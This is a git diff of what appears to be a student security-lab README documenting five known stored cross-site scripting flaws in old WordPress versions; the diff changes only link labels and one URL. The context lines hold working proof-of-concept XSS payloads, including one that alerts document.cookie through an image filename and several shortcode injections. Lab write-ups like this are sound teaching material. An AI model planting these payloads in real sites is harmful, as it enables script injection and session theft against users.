@@ -19,7 +19,7 @@ Time spent: **3** hours spent in total
     <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px [64 kB]'></a>
     ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link](https://core.trac.wordpress.org/changeset/32299)
 2. (Required) WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
   - [ ] Summary:
     - Vulnerability types: XSS
@@ -33,7 +33,7 @@ Time spent: **3** hours spent in total
     <a href="[caption code=">]</a><a title=" onmouseover=alert('test') ">link</a>
     ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 3. (Required) WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
   - [ ] Summary:
     - Vulnerability types: XSS
@@ -48,7 +48,7 @@ Time spent: **3** hours spent in total
     asdfghjkl<img src=a onerror=alert(document.cookie)>.jpg
     ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 4. (Optional) WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
   - [ ] Summary:
     - Vulnerability types: XSS
@@ -63,7 +63,7 @@ Time spent: **3** hours spent in total
     [embed src='https://youtube.com/embed/12345<svg onload=alert("Attack!")>'][/embed]
     ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 5. (Optional) WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
   - [ ] Summary:
     - Vulnerability types: XSS
@@ -78,7 +78,7 @@ Time spent: **3** hours spent in total
     Test[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>
     ```
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
 ## Assets
 
